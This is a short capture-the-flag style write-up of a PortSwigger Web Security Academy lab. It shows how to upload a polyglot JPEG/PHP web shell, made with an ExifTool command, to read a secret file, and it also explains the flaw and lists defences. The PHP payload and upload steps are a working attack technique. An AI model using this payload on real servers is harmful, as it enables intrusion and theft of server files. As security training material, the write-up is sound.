# Remote code execution via polyglot web shell upload

**Platform:** PortSwigger Web Security Academy (lab)
**Lab:** [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
**Status:** Solved — writeup linked below

> Short: Upload a PHP web shell disguised as an image using ExifTool, locate the uploaded file and exfiltrate `/home/carlos/secret`.

## TL;DR

I used a *polyglot* JPEG/PHP file (image with PHP code in metadata) so the file passed image checks but still executed on the server. The payload was uploaded as an avatar, its path discovered via Burp, and a GET request returned the secret between `START` and `END` markers.

**Read the full walkthrough on Medium:** [LINK TO MEDIIUM WRITEUP](https://medium.com/@cybernerddd/exploiting-remote-code-execution-via-polygot-web-shell-upload-7dd574751f3b)

---

## Quick steps

1. Create the polyglot image (ExifTool):

```bash
exiftool -Comment='<?php echo "START" . file_get_contents("/home/carlos/secret") . "END"; ?>' innocent.jpg -o polyglot.php
```

2. Log in to the lab account (wiener\:peter) and upload `polyglot.php` as the avatar.
3. Use Burp to find where the file is stored (example path: `/files/avatars/polyglot.php`).
4. Request the file in your browser or via curl. Search for `START`/`END` and extract the secret.

Example URL:

```
https://YOUR-LAB-ID.web-security-academy.net/files/avatars/polyglot.php
```

## Why this works

* The server validates image content (magic bytes) but doesn’t sanitize metadata.
* PHP injected into metadata executes if the server allows `.php` files in the upload directory.
* Simple extension/content checks are insufficient when metadata and filename handling are lax.

## Defenses

* Serve uploaded files from **non-executable** locations.
* Strip metadata from uploads or sanitize image files using image libraries (e.g., re-encode images server-side).
* Validate both file content and file extension, and use strict MIME checks.
* Sanitize filenames and avoid allowing `.php` (or any executable) extensions in upload paths.

---

## Lab info / notes

* **Goal:** Upload a PHP web shell disguised as an image and exfiltrate `/home/carlos/secret`.
* **Credentials:** `wiener:peter` [(lab account)](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
* **Tools used:** ExifTool, Burp Suite (proxy/intercept), browser

---
